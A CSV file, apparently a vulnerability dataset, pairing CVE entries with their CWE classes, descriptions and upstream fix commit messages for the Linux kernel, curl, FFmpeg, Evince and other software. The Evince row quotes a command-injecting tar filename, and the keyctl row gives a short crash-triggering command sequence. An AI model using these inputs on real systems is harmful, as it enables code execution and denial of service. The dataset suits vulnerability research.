CVE-2018-12904,,2018-06-27,"In arch/x86/kvm/vmx.c in the Linux kernel before 4.17.2, when nested virtualization is used, local attackers could cause L1 KVM guests to VMEXIT, potentially allowing privilege escalations and denial of service attacks due to lack of checking of CPL.","VMX instructions executed inside a L1 VM will always trigger a VM exit even when executed with cpl 3. This means we must perform the privilege check in software.  Fixes: 70f3aac(""kvm: nVMX: Remove superfluous VMX instruction fault checks"") Cc: stable@vger.kernel.org Signed-off-by: Felix Wilhelm <fwilhelm@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2015-7872,CWE-20,2015-11-16,The key_gc_unused_keys function in security/keys/gc.c in the Linux kernel through 4.2.6 allows local users to cause a denial of service (OOPS) via crafted keyctl commands.,"The following sequence of commands:      i=`keyctl add user a a @s`     keyctl request2 keyring foo bar @t     keyctl unlink $i @s  tries to invoke an upcall to instantiate a keyring if one doesn't already exist by that name within the user's keyring set.  However, if the upcall fails, the code sets keyring->type_data.reject_error to -ENOKEY or some other error code.  When the key is garbage collected, the key destroy function is called unconditionally and keyring_destroy() uses list_empty() on keyring->type_data.link - which is in a union with reject_error. Subsequently, the kernel tries to unlink the keyring from the keyring names list - which oopses like this:  	BUG: unable to handle kernel paging request at 00000000ffffff8a 	IP: [<ffffffff8126e051>] keyring_destroy+0x3d/0x88 	... 	Workqueue: events key_garbage_collector 	... 	RIP: 0010:[<ffffffff8126e051>] keyring_destroy+0x3d/0x88 	RSP: 0018:ffff88003e2f3d30  EFLAGS: 00010203 	RAX: 00000000ffffff82 RBX: ffff88003bf1a900 RCX: 0000000000000000 	RDX: 0000000000000000 RSI: 000000003bfc6901 RDI: ffffffff81a73a40 	RBP: ffff88003e2f3d38 R08: 0000000000000152 R09: 0000000000000000 	R10: ffff88003e2f3c18 R11: 000000000000865b R12: ffff88003bf1a900 	R13: 0000000000000000 R14: ffff88003bf1a908 R15: ffff88003e2f4000 	... 	CR2: 00000000ffffff8a CR3: 000000003e3ec000 CR4: 00000000000006f0 	... 	Call Trace: 	 [<ffffffff8126c756>] key_gc_unused_keys.constprop.1+0x5d/0x10f 	 [<ffffffff8126ca71>] key_garbage_collector+0x1fa/0x351 	 [<ffffffff8105ec9b>] process_one_work+0x28e/0x547 	 [<ffffffff8105fd17>] worker_thread+0x26e/0x361 	 [<ffffffff8105faa9>] ? rescuer_thread+0x2a8/0x2a8 	 [<ffffffff810648ad>] kthread+0xf3/0xfb 	 [<ffffffff810647ba>] ? kthread_create_on_node+0x1c2/0x1c2 	 [<ffffffff815f2ccf>] ret_from_fork+0x3f/0x70 	 [<ffffffff810647ba>] ? kthread_create_on_node+0x1c2/0x1c2  Note the value in RAX.  This is a 32-bit representation of -ENOKEY.  The solution is to only call ->destroy() if the key was successfully instantiated.  Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Tested-by: Dmitry Vyukov <dvyukov@google.com>"
CVE-2018-10887,CWE-125,2018-07-10,"A flaw was found in libgit2 before version 0.27.3. It has been discovered that an unexpected sign extension in git_delta_apply function in delta.c file may lead to an integer overflow which in turn leads to an out of bound read, allowing to read before the base object. An attacker may use this flaw to leak memory addresses or cause a Denial of Service.","Our delta code was originally adapted from JGit, which itself adapted it from git itself. Due to this heritage, we inherited a bug from git.git in how we compute the delta offset, which was fixed upstream in 48fb7deb5 (Fix big left-shifts of unsigned char, 2009-06-17). As explained by Linus:      Shifting 'unsigned char' or 'unsigned short' left can result in sign     extension errors, since the C integer promotion rules means that the     unsigned char/short will get implicitly promoted to a signed 'int' due to     the shift (or due to other operations).      This normally doesn't matter, but if you shift things up sufficiently, it     will now set the sign bit in 'int', and a subsequent cast to a bigger type     (eg 'long' or 'unsigned long') will now sign-extend the value despite the     original expression being unsigned.      One example of this would be something like              unsigned long size;             unsigned char c;              size += c << 24;      where despite all the variables being unsigned, 'c << 24' ends up being a     signed entity, and will get sign-extended when then doing the addition in     an 'unsigned long' type.      Since git uses 'unsigned char' pointers extensively, we actually have this     bug in a couple of places.  In our delta code, we inherited such a bogus shift when computing the offset at which the delta base is to be found. Due to the sign extension we can end up with an offset where all the bits are set. This can allow an arbitrary memory read, as the addition in `base_len < off + len` can now overflow if `off` has all its bits set.  Fix the issue by casting the result of `*delta++ << 24UL` to an unsigned integer again. Add a test with a crafted delta that would actually succeed with an out-of-bounds read in case where the cast wouldn't exist.  Reported-by: Riccardo Schirone <rschiron@redhat.com> Test-provided-by: Riccardo Schirone <rschiron@redhat.com>"
CVE-2014-3185,CWE-119,2014-09-28,Multiple buffer overflows in the command_port_read_callback function in drivers/usb/serial/whiteheat.c in the Whiteheat USB Serial Driver in the Linux kernel before 3.16.2 allow physically proximate attackers to execute arbitrary code or cause a denial of service (memory corruption and system crash) via a crafted device that provides a large amount of (1) EHCI or (2) XHCI data associated with a bulk response.,This patch fixes a potential security issue in the whiteheat USB driver which might allow a local attacker to cause kernel memory corrpution. This is due to an unchecked memcpy into a fixed size buffer (of 64 bytes). On EHCI and XHCI busses it's possible to craft responses greater than 64 bytes leading a buffer overflow.  Signed-off-by: James Forshaw <forshaw@google.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CVE-2015-5252,CWE-264,2015-12-29,"vfs.c in smbd in Samba 3.x and 4.x before 4.1.22, 4.2.x before 4.2.7, and 4.3.x before 4.3.3, when share names with certain substring relationships exist, allows remote attackers to bypass intended file-access restrictions via a symlink that points outside of a share.",
CVE-2017-8072,CWE-388,2017-04-23,"The cp2112_gpio_direction_input function in drivers/hid/hid-cp2112.c in the Linux kernel 4.9.x before 4.9.9 does not have the expected EIO error status for a zero-length report, which allows local users to have an unspecified impact via unknown vectors.","In case of a zero-length report, the gpio direction_input callback would currently return success instead of an errno.  Fixes: 1ffb3c4 (""HID: cp2112: make transfer buffers DMA capable"") Cc: stable <stable@vger.kernel.org>     # 4.9 Signed-off-by: Johan Hovold <johan@kernel.org> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2018-1000879,CWE-476,2018-12-20,"libarchive version commit 379867ecb330b3a952fb7bfa7bffb7bbd5547205 onwards (release v3.3.0 onwards) contains a CWE-476: NULL Pointer Dereference vulnerability in ACL parser - libarchive/archive_acl.c, archive_acl_from_text_l() that can result in Crash/DoS. This attack appear to be exploitable via the victim must open a specially crafted archive file.",
CVE-2018-8785,CWE-120,2018-11-29,FreeRDP prior to version 2.0.0-rc4 contains a Heap-Based Buffer Overflow in function zgfx_decompress() that results in a memory corruption and probably even a remote code execution.,Thanks to Eyal Itkin from Check Point Software Technologies.
CVE-2017-13048,CWE-125,2017-09-14,The RSVP parser in tcpdump before 4.9.2 has a buffer over-read in print-rsvp.c:rsvp_obj_print().,
CVE-2017-6307,CWE-787,2017-02-24,"An issue was discovered in tnef before 1.4.13. Two OOB Writes have been identified in src/mapi_attr.c:mapi_attr_read(). These might lead to invalid read and write operations, controlled by an attacker.",
CVE-2017-17855,CWE-119,2017-12-27,kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging improper use of pointers in place of scalars.,"This could be made safe by passing through a reference to env and checking for env->allow_ptr_leaks, but it would only work one way and is probably not worth the hassle - not doing it will not directly lead to program rejection.  Fixes: f1174f7 (""bpf/verifier: rework value tracking"") Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2015-8660,CWE-264,2015-12-28,"The ovl_setattr function in fs/overlayfs/inode.c in the Linux kernel through 4.3.3 attempts to merge distinct setattr operations, which allows local users to bypass intended access restrictions and modify the attributes of arbitrary overlay files via a crafted application.","[Al Viro] The bug is in being too enthusiastic about optimizing ->setattr() away - instead of ""copy verbatim with metadata"" + ""chmod/chown/utimes"" (with the former being always safe and the latter failing in case of insufficient permissions) it tries to combine these two.  Note that copyup itself will have to do ->setattr() anyway; _that_ is where the elevated capabilities are right.  Having these two ->setattr() (one to set verbatim copy of metadata, another to do what overlayfs ->setattr() had been asked to do in the first place) combined is where it breaks.  Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Cc: <stable@vger.kernel.org> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2016-8649,CWE-264,2017-05-01,"lxc-attach in LXC before 1.0.9 and 2.x before 2.0.6 allows an attacker inside of an unprivileged container to use an inherited file descriptor, of the host's /proc, to access the rest of the host's filesystem via the openat() family of syscalls.","So far, we opened a file descriptor refering to proc on the host inside the host namespace and handed that fd to the attached process in attach_child_main(). This was done to ensure that LSM labels were correctly setup. However, by exploiting a potential kernel bug, ptrace could be used to prevent the file descriptor from being closed which in turn could be used by an unprivileged container to gain access to the host namespace. Aside from this needing an upstream kernel fix, we should make sure that we don't pass the fd for proc itself to the attached process. However, we cannot completely prevent this, as the attached process needs to be able to change its apparmor profile by writing to /proc/self/attr/exec or /proc/self/attr/current. To minimize the attack surface, we only send the fd for /proc/self/attr/exec or /proc/self/attr/current to the attached process. To do this we introduce a little more IPC between the child and parent:  	 * IPC mechanism: (X is receiver) 	 *   initial process        intermediate          attached 	 *        X           <---  send pid of 	 *                          attached proc, 	 *                          then exit 	 *    send 0 ------------------------------------>    X 	 *                                              [do initialization] 	 *        X  <------------------------------------  send 1 	 *   [add to cgroup, ...] 	 *    send 2 ------------------------------------>    X 	 *						[set LXC_ATTACH_NO_NEW_PRIVS] 	 *        X  <------------------------------------  send 3 	 *   [open LSM label fd] 	 *    send 4 ------------------------------------>    X 	 *   						[set LSM label] 	 *   close socket                                 close socket 	 *                                                run program  The attached child tells the parent when it is ready to have its LSM labels set up. The parent then opens an approriate fd for the child PID to /proc/<pid>/attr/exec or /proc/<pid>/attr/current and sends it via SCM_RIGHTS to the child. The child can then set its LSM laben. Both sides then close the socket fds and the child execs the requested process.  Signed-off-by: Christian Brauner <christian.brauner@canonical.com>"
CVE-2012-6542,CWE-200,2013-03-15,"The llc_ui_getname function in net/llc/af_llc.c in the Linux kernel before 3.6 has an incorrect return value in certain circumstances, which allows local users to obtain sensitive information from kernel stack memory via a crafted application that leverages an uninitialized pointer argument.","The LLC code wrongly returns 0, i.e. ""success"", when the socket is zapped. Together with the uninitialized uaddrlen pointer argument from sys_getsockname this leads to an arbitrary memory leak of up to 128 bytes kernel stack via the getsockname() syscall.  Return an error instead when the socket is zapped to prevent the info leak. Also remove the unnecessary memset(0). We don't directly write to the memory pointed by uaddr but memcpy() a local structure at the end of the function that is properly initialized.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-1237,CWE-284,2016-06-29,"nfsd in the Linux kernel through 4.6.3 allows local users to bypass intended file-permission restrictions by setting a POSIX ACL, related to nfs2acl.c, nfs3acl.c, and nfs4acl.c.","Use set_posix_acl, which includes proper permission checks, instead of calling ->set_acl directly.  Without this anyone may be able to grant themselves permissions to a file by setting the ACL.  Lock the inode to make the new checks atomic with respect to set_acl. (Also, nfsd was the only caller of set_acl not locking the inode, so I suspect this may fix other races.)  This also simplifies the code, and ensures our ACLs are checked by posix_acl_valid.  The permission checks and the inode locking were lost with commit 4ac7249, which changed nfsd to use the set_acl inode operation directly instead of going through xattr handlers.  Reported-by: David Sinquin <david@sinquin.eu> [agreunba@redhat.com: use set_posix_acl] Fixes: 4ac7249 Cc: Christoph Hellwig <hch@infradead.org> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: stable@vger.kernel.org Signed-off-by: J. Bruce Fields <bfields@redhat.com>"
CVE-2015-1792,CWE-399,2015-06-12,"The do_free_upto function in crypto/cms/cms_smime.c in OpenSSL before 0.9.8zg, 1.0.0 before 1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of service (infinite loop) via vectors that trigger a NULL value of a BIO data structure, as demonstrated by an unrecognized X.660 OID for a hash function.",If content is detached and not binary mode translate the input to CRLF format. Before this change the input was verified verbatim which lead to a discrepancy between sign and verify.
CVE-2012-2127,CWE-119,2012-06-21,"fs/proc/root.c in the procfs implementation in the Linux kernel before 3.2 does not properly interact with CLONE_NEWPID clone system calls, which allows remote attackers to cause a denial of service (reference leak and memory consumption) by making many connections to a daemon that uses PID namespaces to isolate clients, as demonstrated by vsftpd.",kern_mount() doesn't pair with plain mntput()...  Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>
CVE-2011-2918,CWE-400,2012-05-24,"The Performance Events subsystem in the Linux kernel before 3.1 does not properly handle event overflows associated with PERF_COUNT_SW_CPU_CLOCK events, which allows local users to cause a denial of service (system hang) via a crafted application.","The nmi parameter indicated if we could do wakeups from the current context, if not, we would set some state and self-IPI and let the resulting interrupt do the wakeup.  For the various event classes:    - hardware: nmi=0; PMI is in fact an NMI or we run irq_work_run from     the PMI-tail (ARM etc.)   - tracepoint: nmi=0; since tracepoint could be from NMI context.   - software: nmi=[0,1]; some, like the schedule thing cannot     perform wakeups, and hence need 0.  As one can see, there is very little nmi=1 usage, and the down-side of not using it is that on some platforms some software events can have a jiffy delay in wakeup (when arch_irq_work_raise isn't implemented).  The up-side however is that we can remove the nmi parameter and save a bunch of conditionals in fast paths.  Signed-off-by: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: Michael Cree <mcree@orcon.net.nz> Cc: Will Deacon <will.deacon@arm.com> Cc: Deng-Cheng Zhu <dengcheng.zhu@gmail.com> Cc: Anton Blanchard <anton@samba.org> Cc: Eric B Munson <emunson@mgebm.net> Cc: Heiko Carstens <heiko.carstens@de.ibm.com> Cc: Paul Mundt <lethal@linux-sh.org> Cc: David S. Miller <davem@davemloft.net> Cc: Frederic Weisbecker <fweisbec@gmail.com> Cc: Jason Wessel <jason.wessel@windriver.com> Cc: Don Zickus <dzickus@redhat.com> Link: http://lkml.kernel.org/n/tip-agjev8eu666tvknpb3iaj0fg@git.kernel.org Signed-off-by: Ingo Molnar <mingo@elte.hu>"
CVE-2017-17807,CWE-862,2017-12-20,"The KEYS subsystem in the Linux kernel before 4.14.6 omitted an access-control check when adding a key to the current task's ""default request-key keyring"" via the request_key() system call, allowing a local user to use a sequence of crafted system calls to add keys to a keyring with only Search permission (not Write permission) to that keyring, related to construct_get_dest_keyring() in security/keys/request_key.c.","When the request_key() syscall is not passed a destination keyring, it links the requested key (if constructed) into the ""default"" request-key keyring.  This should require Write permission to the keyring.  However, there is actually no permission check.  This can be abused to add keys to any keyring to which only Search permission is granted.  This is because Search permission allows joining the keyring.  keyctl_set_reqkey_keyring(KEY_REQKEY_DEFL_SESSION_KEYRING) then will set the default request-key keyring to the session keyring. Then, request_key() can be used to add keys to the keyring.  Both negatively and positively instantiated keys can be added using this method.  Adding negative keys is trivial.  Adding a positive key is a bit trickier.  It requires that either /sbin/request-key positively instantiates the key, or that another thread adds the key to the process keyring at just the right time, such that request_key() misses it initially but then finds it in construct_alloc_key().  Fix this bug by checking for Write permission to the keyring in construct_get_dest_keyring() when the default keyring is being used.  We don't do the permission check for non-default keyrings because that was already done by the earlier call to lookup_user_key().  Also, request_key_and_link() is currently passed a 'struct key *' rather than a key_ref_t, so the ""possessed"" bit is unavailable.  We also don't do the permission check for the ""requestor keyring"", to continue to support the use case described by commit 8bbf497 (""KEYS: Alter use of key instantiation link-to-keyring argument"") where /sbin/request-key recursively calls request_key() to add keys to the original requestor's destination keyring.  (I don't know of any users who actually do that, though...)  Fixes: 3e30148 (""[PATCH] Keys: Make request-key create an authorisation key"") Cc: <stable@vger.kernel.org>	# v2.6.13+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com>"
CVE-2017-8284,CWE-94,2017-04-26,"The disas_insn function in target/i386/translate.c in QEMU before 2.9.0, when TCG mode without hardware acceleration is used, does not limit the instruction size, which allows local users to gain privileges by creating a modified basic block that injects code into a setuid program, as demonstrated by procmail. NOTE: the vendor has stated ""this bug does not violate any security guarantees QEMU makes.",This fixes the bug: 'user-to-root privesc inside VM via bad translation caching' reported by Jann Horn here: https://bugs.chromium.org/p/project-zero/issues/detail?id=1122  Reviewed-by: Richard Henderson <rth@twiddle.net> CC: Peter Maydell <peter.maydell@linaro.org> CC: Paolo Bonzini <pbonzini@redhat.com> Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Pranith Kumar <bobby.prani@gmail.com> Message-Id: <20170323175851.14342-1-bobby.prani@gmail.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>
CVE-2016-9391,,2017-03-23,The jpc_bitstream_getbits function in jpc_bs.c in JasPer before 2.0.10 allows remote attackers to cause a denial of service (assertion failure) via a very large integer.,"for a larger sized integer than what can be handled (i.e., return with an error instead of failing an assert)."
CVE-2014-2672,CWE-362,2014-04-01,Race condition in the ath_tx_aggr_sleep function in drivers/net/wireless/ath/ath9k/xmit.c in the Linux kernel before 3.13.7 allows remote attackers to cause a denial of service (system crash) via a large amount of network traffic that triggers certain list deletions.,We check tid->sched without a lock taken on ath_tx_aggr_sleep(). That is race condition which can result of doing list_del(&tid->list) twice (second time with poisoned list node) and cause crash like shown below:  [424271.637220] BUG: unable to handle kernel paging request at 00100104 [424271.637328] IP: [<f90fc072>] ath_tx_aggr_sleep+0x62/0xe0 [ath9k] ... [424271.639953] Call Trace: [424271.639998]  [<f90f6900>] ? ath9k_get_survey+0x110/0x110 [ath9k] [424271.640083]  [<f90f6942>] ath9k_sta_notify+0x42/0x50 [ath9k] [424271.640177]  [<f809cfef>] sta_ps_start+0x8f/0x1c0 [mac80211] [424271.640258]  [<c10f730e>] ? free_compound_page+0x2e/0x40 [424271.640346]  [<f809e915>] ieee80211_rx_handlers+0x9d5/0x2340 [mac80211] [424271.640437]  [<c112f048>] ? kmem_cache_free+0x1d8/0x1f0 [424271.640510]  [<c1345a84>] ? kfree_skbmem+0x34/0x90 [424271.640578]  [<c10fc23c>] ? put_page+0x2c/0x40 [424271.640640]  [<c1345a84>] ? kfree_skbmem+0x34/0x90 [424271.640706]  [<c1345a84>] ? kfree_skbmem+0x34/0x90 [424271.640787]  [<f809dde3>] ? ieee80211_rx_handlers_result+0x73/0x1d0 [mac80211] [424271.640897]  [<f80a07a0>] ieee80211_prepare_and_rx_handle+0x520/0xad0 [mac80211] [424271.641009]  [<f809e22d>] ? ieee80211_rx_handlers+0x2ed/0x2340 [mac80211] [424271.641104]  [<c13846ce>] ? ip_output+0x7e/0xd0 [424271.641182]  [<f80a1057>] ieee80211_rx+0x307/0x7c0 [mac80211] [424271.641266]  [<f90fa6ee>] ath_rx_tasklet+0x88e/0xf70 [ath9k] [424271.641358]  [<f80a0f2c>] ? ieee80211_rx+0x1dc/0x7c0 [mac80211] [424271.641445]  [<f90f82db>] ath9k_tasklet+0xcb/0x130 [ath9k]  Bug report: https://bugzilla.kernel.org/show_bug.cgi?id=70551  Reported-and-tested-by: Max Sydorenko <maxim.stargazer@gmail.com> Cc: stable@vger.kernel.org Signed-off-by: Stanislaw Gruszka <sgruszka@redhat.com> Signed-off-by: John W. Linville <linville@tuxdriver.com>
CVE-2017-9227,CWE-125,2017-05-24,"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A stack out-of-bounds read occurs in mbc_enc_len() during regular expression searching. Invalid handling of reg->dmin in forward_search_range() could result in an invalid pointer dereference, as an out-of-bounds read from a stack buffer.",
CVE-2018-0500,CWE-787,2018-07-11,"Curl_smtp_escape_eob in lib/smtp.c in curl 7.54.1 to and including curl 7.60.0 has a heap-based buffer overflow that might be exploitable by an attacker who can control the data that curl transmits over SMTP with certain settings (i.e., use of a nonstandard --limit-rate argument or CURLOPT_BUFFERSIZE value).","... not the read buffer size, as that can be set smaller and thus cause a buffer overflow! CVE-2018-0500  Reported-by: Peter Wu Bug: https://curl.haxx.se/docs/adv_2018-70a2.html"
CVE-2017-1000083,,2017-09-05,"backend/comics/comics-document.c (aka the comic book backend) in GNOME Evince before 3.24.1 allows remote attackers to execute arbitrary commands via a .cbt file that is a TAR archive containing a filename beginning with a ""--"" command-line option substring, as demonstrated by a --checkpoint-action=exec=bash at the beginning of the filename.","When handling tar files, or using a command with tar-compatible syntax, to open comic-book archives, both the archive name (the name of the comics file) and the filename (the name of a page within the archive) are quoted to not be interpreted by the shell.  But the filename is completely with the attacker's control and can start with ""--"" which leads to tar interpreting it as a command line flag.  This can be exploited by creating a CBT file (a tar archive with the .cbt suffix) with an embedded file named something like this: ""--checkpoint-action=exec=bash -c 'touch ~/hacked;'.jpg""  CBT files are infinitely rare (CBZ is usually used for DRM-free commercial releases, CBR for those from more dubious provenance), so removing support is the easiest way to avoid the bug triggering. All this code was rewritten in the development release for GNOME 3.26 to not shell out to any command, closing off this particular attack vector.  This also removes the ability to use libarchive's bsdtar-compatible binary for CBZ (ZIP), CB7 (7zip), and CBR (RAR) formats. The first two are already supported by unzip and 7zip respectively. libarchive's RAR support is limited, so unrar is a requirement anyway.  Discovered by Felix Wilhelm from the Google Security Team.  https://bugzilla.gnome.org/show_bug.cgi?id=784630"
CVE-2019-11339,CWE-125,2019-04-19,The studio profile decoder in libavcodec/mpeg4videodec.c in FFmpeg 4.0 before 4.0.4 and 4.1 before 4.1.2 allows remote attackers to cause a denial of service (out-of-array access) or possibly have unspecified other impact via crafted MPEG-4 video data.,Fixes: Out of array access Fixes: 13500/clusterfuzz-testcase-minimized-ffmpeg_AV_CODEC_ID_MPEG4_fuzzer-5769760178962432  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/projects/ffmpeg Reviewed-by: Kieran Kunhya <kierank@obe.tv> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-9120,CWE-264,2016-12-08,Race condition in the ion_ioctl function in drivers/staging/android/ion/ion.c in the Linux kernel before 4.6 allows local users to gain privileges or cause a denial of service (use-after-free) by calling ION_IOC_FREE on two CPUs at the same time.,There is a use-after-free problem in the ion driver. This is caused by a race condition in the ion_ioctl() function.  A handle has ref count of 1 and two tasks on different cpus calls ION_IOC_FREE simultaneously.  cpu 0                                   cpu 1 ------------------------------------------------------- ion_handle_get_by_id() (ref == 2)                             ion_handle_get_by_id()                             (ref == 3)  ion_free() (ref == 2)  ion_handle_put() (ref == 1)                              ion_free()                             (ref == 0 so ion_handle_destroy() is                             called                             and the handle is freed.)                              ion_handle_put() is called and it                             decreases the slub's next free pointer  The problem is detected as an unaligned access in the spin lock functions since it uses load exclusive  instruction. In some cases it corrupts the slub's free pointer which causes a mis-aligned access to the next free pointer.(kmalloc returns a pointer like ffffc0745b4580aa). And it causes lots of other hard-to-debug problems.  This symptom is caused since the first member in the ion_handle structure is the reference count and the ion driver decrements the reference after it has been freed.  To fix this problem client->lock mutex is extended to protect all the codes that uses the handle.  Signed-off-by: Eun Taik Lee <eun.taik.lee@samsung.com> Reviewed-by: Laura Abbott <labbott@redhat.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CVE-2019-13295,CWE-125,2019-07-05,ImageMagick 7.0.8-50 Q16 has a heap-based buffer over-read at MagickCore/threshold.c in AdaptiveThresholdImage because a width of zero is mishandled.,
CVE-2013-7020,CWE-119,2013-12-09,"The read_header function in libavcodec/ffv1dec.c in FFmpeg before 2.1 does not properly enforce certain bit-count and colorspace constraints, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted FFV1 data.",Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2017-8073,CWE-119,2017-04-23,"WeeChat before 1.7.1 allows a remote crash by sending a filename via DCC to the IRC plugin. This occurs in the irc_ctcp_dcc_filename_without_quotes function during quote removal, with a buffer overflow.",
CVE-2016-10009,CWE-426,2017-01-05,Untrusted search path vulnerability in ssh-agent.c in ssh-agent in OpenSSH before 7.4 allows remote attackers to execute arbitrary local PKCS#11 modules by leveraging control over a forwarded agent-socket.,ssh-pkcs11-helper) a PKCS#11 module; ok markus@
CVE-2019-12904,CWE-668,2019-06-20,"In Libgcrypt 1.8.4, the C implementation of AES is vulnerable to a flush-and-reload side-channel attack because physical addresses are available to other processes. (The C implementation is used on platforms where an assembly-language implementation is unavailable.) NOTE: the vendor's position is that the issue report cannot be validated because there is no description of an attack","* cipher/rijndael-internal.h (ATTR_ALIGNED_64): New. * cipher/rijndael-tables.h (encT): Move to 'enc_tables' structure. (enc_tables): New structure for encryption table with counters before and after. (encT): New macro. (dec_tables): Add counters before and after encryption table; Move from .rodata to .data section. (do_encrypt): Change 'encT' to 'enc_tables.T'. (do_decrypt): Change '&dec_tables' to 'dec_tables.T'. * cipher/cipher-gcm.c (prefetch_table): Make inline; Handle input with length not multiple of 256. (prefetch_enc, prefetch_dec): Modify pre- and post-table counters to unshare look-up table pages between processes. --  GnuPG-bug-id: 4541 Signed-off-by: Jussi Kivilinna <jussi.kivilinna@iki.fi>"
CVE-2018-13095,CWE-787,2018-07-03,"An issue was discovered in fs/xfs/libxfs/xfs_inode_buf.c in the Linux kernel through 4.17.3. A denial of service (memory corruption and BUG) can occur for a corrupted xfs image upon encountering an inode that is in extent format, but has more extents than fit in the inode fork.","When the inode is in extent format, it can't have more extents that fit in the inode fork. We don't currenty check this, and so this corruption goes unnoticed by the inode verifiers. This can lead to crashes operating on invalid in-memory structures.  Attempts to access such a inode will now error out in the verifier rather than allowing modification operations to proceed.  Reported-by: Wen Xu <wen.xu@gatech.edu> Signed-off-by: Dave Chinner <dchinner@redhat.com> Reviewed-by: Darrick J. Wong <darrick.wong@oracle.com> [darrick: fix a typedef, add some braces and breaks to shut up compiler warnings] Signed-off-by: Darrick J. Wong <darrick.wong@oracle.com>"
CVE-2016-0723,CWE-200,2016-02-08,Race condition in the tty_ioctl function in drivers/tty/tty_io.c in the Linux kernel through 4.4.1 allows local users to obtain sensitive information from kernel memory or cause a denial of service (use-after-free and system crash) by making a TIOCGETD ioctl call during processing of a TIOCSETD ioctl call.,"ioctl(TIOCGETD) retrieves the line discipline id directly from the ldisc because the line discipline id (c_line) in termios is untrustworthy; userspace may have set termios via ioctl(TCSETS*) without actually changing the line discipline via ioctl(TIOCSETD).  However, directly accessing the current ldisc via tty->ldisc is unsafe; the ldisc ptr dereferenced may be stale if the line discipline is changing via ioctl(TIOCSETD) or hangup.  Wait for the line discipline reference (just like read() or write()) to retrieve the ""current"" line discipline id.  Cc: <stable@vger.kernel.org> Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2015-0278,CWE-273,2015-05-18,"libuv before 0.10.34 does not properly drop group privileges, which allows context-dependent attackers to gain privileges via unspecified vectors.",Partial fix for #1093
CVE-2016-2315,CWE-119,2016-04-08,"revision.c in git before 2.7.4 uses an incorrect integer data type, which allows remote attackers to execute arbitrary code via a (1) long filename or (2) many nested trees, leading to a heap-based buffer overflow.","When we already know the length of a string (e.g., because we just malloc'd to fit it), it's nicer to use memcpy than strcpy, as it makes it more obvious that we are not going to overflow the buffer (because the size we pass matches the size in the allocation).  This also eliminates calls to strcpy, which make auditing the code base harder.  Signed-off-by: Jeff King <peff@peff.net> Signed-off-by: Junio C Hamano <gitster@pobox.com>"
CVE-2011-1585,CWE-264,2013-06-08,"The cifs_find_smb_ses function in fs/cifs/connect.c in the Linux kernel before 2.6.36 does not properly determine the associations between users and sessions, which allows local users to bypass CIFS share authentication by leveraging a mount of a share by a different user.","This patch replaces the earlier patch by the same name. The only difference is that MAX_PASSWORD_SIZE has been increased to attempt to match the limits that windows enforces.  Do a better job of matching sessions by authtype. Matching by username for a Kerberos session is incorrect, and anonymous sessions need special handling.  Also, in the case where we do match by username, we also need to match by password. That ensures that someone else doesn't ""borrow"" an existing session without needing to know the password.  Finally, passwords can be longer than 16 bytes. Bump MAX_PASSWORD_SIZE to 512 to match the size that the userspace mount helper allows.  Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <sfrench@us.ibm.com>"
CVE-2000-1254,CWE-310,2016-05-05,"crypto/rsa/rsa_gen.c in OpenSSL before 0.9.6 mishandles C bitwise-shift operations that exceed the size of an expression, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging improper RSA key generation on 64-bit HP-UX platforms.",
CVE-2016-10088,CWE-416,2016-12-30,"The sg implementation in the Linux kernel through 4.9 does not properly restrict write operations in situations where the KERNEL_DS option is set, which allows local users to read or write to arbitrary kernel memory locations or cause a denial of service (use-after-free) by leveraging access to a /dev/sg device, related to block/bsg.c and drivers/scsi/sg.c.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-9576.","Both damn things interpret userland pointers embedded into the payload; worse, they are actually traversing those.  Leaving aside the bad API design, this is very much _not_ safe to call with KERNEL_DS. Bail out early if that happens.  Cc: stable@vger.kernel.org Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2016-2184,,2016-04-27,"The create_fixed_stream_quirk function in sound/usb/quirks.c in the snd-usb-audio driver in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference or double free, and system crash) via a crafted endpoints value in a USB device descriptor.",create_fixed_stream_quirk() may cause a NULL-pointer dereference by accessing the non-existing endpoint when a USB device with a malformed USB descriptor is used.  This patch avoids it simply by adding a sanity check of bNumEndpoints before the accesses.  Bugzilla: https://bugzilla.suse.com/show_bug.cgi?id=971125 Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>
